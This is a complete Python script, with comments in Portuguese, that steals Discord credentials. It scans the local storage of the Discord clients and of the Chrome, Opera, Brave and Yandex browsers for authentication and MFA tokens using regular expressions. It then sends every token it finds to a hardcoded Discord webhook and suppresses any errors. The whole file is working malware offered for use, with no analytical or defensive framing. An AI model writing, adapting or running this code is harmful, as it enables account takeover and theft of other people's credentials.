import os
import re
import json

from urllib.request import Request, urlopen

# URL do seu webhook
WEBHOOK_URL = 'https://discord.com/api/webhooks/1176566609696006225/-e6CtC5nSwEb9uoEE_92PylRtjGx4nEBSgXcIqkUG5Sx8WzvXqSEPu3393pY_Tj1FRku'

# menciona você quando encontrar um token
PING_ME = False

def encontrar_tokens(caminho):
    caminho += '\\Local Storage\\leveldb'

    tokens = []

    for nome_arquivo in os.listdir(caminho):
        if not nome_arquivo.endswith('.log') and not nome_arquivo.endswith('.ldb'):
            continue

        for linha in [x.strip() for x in open(f'{caminho}\\{nome_arquivo}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, linha):
                    tokens.append(token)
    return tokens

def principal():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    caminhos = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    mensagem = '@everyone' if PING_ME else ''

    for plataforma, caminho in caminhos.items():
        if not os.path.exists(caminho):
            continue

        mensagem += f'\n**{plataforma}**\n```\n'

        tokens = encontrar_tokens(caminho)

        if len(tokens) > 0:
            for token in tokens:
                mensagem += f'{token}\n'
        else:
            mensagem += 'Nenhum token encontrado.\n'

        mensagem += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    carga_util = json.dumps({'content': mensagem})

    try:
        requisicao = Request(WEBHOOK_URL, data=carga_util.encode(), headers=headers)
        urlopen(requisicao)
    except:
        pass

if __name__ == '__main__':
    principal()
